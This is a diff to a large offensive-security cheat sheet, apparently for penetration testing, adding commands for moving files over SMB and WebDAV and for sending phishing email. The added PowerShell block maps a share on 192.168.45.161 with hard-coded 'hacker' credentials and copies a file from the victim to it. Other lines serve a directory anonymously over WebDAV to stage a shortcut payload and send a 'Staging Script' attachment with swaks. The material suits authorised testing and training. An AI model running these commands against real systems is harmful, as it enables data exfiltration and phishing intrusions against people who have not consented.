@@ -7062,6 +7062,8 @@ impacket-smbpasswd <RHOST>/<USERNAME>:'<PASSWORD>'@<RHOST> -newpass '<PASSWORD>'
 
 ##### impacket-smbserver
 
+Create a smb server
+
 ```c
 impacket-smbserver local . -smb2support
 impacket-smbserver smbFolder $(pwd) -smb2support
@@ -7072,6 +7074,15 @@ Client side
 ```c
  net use \\IP\smbFolder /u:henrial hernial123
  copy  \\IP\smbFolder\FILE C:\RUTA\FILE
+```
+
+with password
+
+```c
+$pass = ConvertTo-SecureString 'HACKER123!!!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('hacker', $pass)
+New-PSDrive -Name smbFolder -PSProvider FileSystem -Credential $cred -Root \\192.168.45.161\smbFolder
+cp FILE \\192.168.45.161\smbFolder
 ```
 
 Powershell on the victims machine
@@ -10522,6 +10533,7 @@ End Sub
 ```c
 pip3 install wsgidav
 wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/webdav/
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root .
 ```
 
 ##### config.Library-ms
@@ -10562,8 +10574,10 @@ Put the `shortcut file (*.lnk)` into the `webdav` folder.
 
 ##### Send Phishing Email
 
+Create a random <FILE>.txt
+
 ```c
-swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject: Staging Script" --body <FILE>.txt --attach @<FILE> --suppress-data -ap
+swaks --server <RHOST> -t <EMAIL> --from <EMAIL> --header "Subject: Staging Script" --body <FILE>.txt --attach @<FILE> --suppress-data -ap
 ```
 
 ### CVE
